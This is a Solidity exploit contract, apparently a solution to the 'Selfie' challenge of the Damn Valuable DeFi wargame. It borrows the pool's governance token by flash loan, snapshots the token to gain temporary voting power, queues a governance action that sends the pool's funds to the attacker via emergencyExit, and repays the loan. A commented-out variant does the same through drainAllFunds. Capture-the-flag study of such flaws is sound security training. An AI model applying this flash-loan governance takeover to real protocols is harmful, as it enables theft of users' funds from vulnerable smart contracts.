import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract AttackSelfie is IERC3156FlashBorrower {
    SelfiePool pool;
    DamnValuableTokenSnapshot public governanceToken;
    address owner;

    constructor(
        address poolAddress,
        address governanceTokenAddress,
        address _owner
    ) {
        pool = SelfiePool(poolAddress);
        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
        owner = _owner;
    }

    function attack() public {
        uint256 amountToBorrow = pool.maxFlashLoan(address(governanceToken));
        pool.flashLoan(IERC3156FlashBorrower(this), address(pool.token()), amountToBorrow, "");
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata ) external returns (bytes32) {
        governanceToken.snapshot();
        pool.governance().queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", owner)
        );
        governanceToken.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");


    }

    // function receiveTokens(address token, uint256 amount) external {
    //     governanceToken.snapshot();
    //     pool.governance().queueAction(
    //         address(pool),
    //         abi.encodeWithSignature("drainAllFunds(address)", owner),
    //         0
    //     );
    //     governanceToken.transfer(address(pool), amount);
    // }
}
